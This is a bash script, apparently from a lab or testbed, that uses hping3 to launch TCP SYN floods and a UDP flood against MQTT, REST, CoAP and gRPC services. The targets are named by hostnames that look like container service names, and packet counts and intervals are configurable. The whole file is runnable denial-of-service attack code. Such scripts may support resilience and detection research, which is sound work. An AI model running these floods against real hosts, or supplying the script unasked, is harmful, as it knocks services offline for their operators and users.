#!/bin/bash

TARGET=$1
COUNT=${2:-500}
INTERVAL=${3:-u500}

MQTT_HOST="mqtt_broker"
REST_HOST="rest_api"
COAP_HOST="coap_server"
GRPC_HOST="grpc_server"

usage() {
    echo "Usage:"
    echo "  ./hping3_attack.sh mqtt [count] [interval]"
    echo "  ./hping3_attack.sh rest [count] [interval]"
    echo "  ./hping3_attack.sh coap [count] [interval]"
    echo "  ./hping3_attack.sh grpc [count] [interval]"
    echo "  ./hping3_attack.sh all  [count] [interval]"
    echo ""
    echo "Example:"
    echo "  ./hping3_attack.sh rest 500 u500"
    echo "  ./hping3_attack.sh all 1000 u1000"
}

check_hping3() {
    if ! command -v hping3 >/dev/null 2>&1; then
        echo "[ERROR] hping3 is not installed."
        exit 1
    fi
}

run_mqtt() {
    echo "[ATTACK] MQTT TCP SYN Flood -> ${MQTT_HOST}:1883"
    hping3 -S -p 1883 -i "$INTERVAL" -c "$COUNT" "$MQTT_HOST"
}

run_rest() {
    echo "[ATTACK] REST API TCP SYN Flood -> ${REST_HOST}:5000"
    hping3 -S -p 5000 -i "$INTERVAL" -c "$COUNT" "$REST_HOST"
}

run_coap() {
    echo "[ATTACK] CoAP UDP Flood -> ${COAP_HOST}:5683"
    hping3 --udp -p 5683 -i "$INTERVAL" -c "$COUNT" "$COAP_HOST"
}

run_grpc() {
    echo "[ATTACK] gRPC TCP SYN Flood -> ${GRPC_HOST}:50051"
    hping3 -S -p 50051 -i "$INTERVAL" -c "$COUNT" "$GRPC_HOST"
}

if [ -z "$TARGET" ]; then
    usage
    exit 1
fi

check_hping3

case "$TARGET" in
    mqtt)
        run_mqtt
        ;;
    rest)
        run_rest
        ;;
    coap)
        run_coap
        ;;
    grpc)
        run_grpc
        ;;
    all)
        run_mqtt
        sleep 3
        run_rest
        sleep 3
        run_coap
        sleep 3
        run_grpc
        ;;
    *)
        echo "[ERROR] Unknown target: $TARGET"
        usage
        exit 1
        ;;
esac

echo "[DONE] hping3 attack finished."
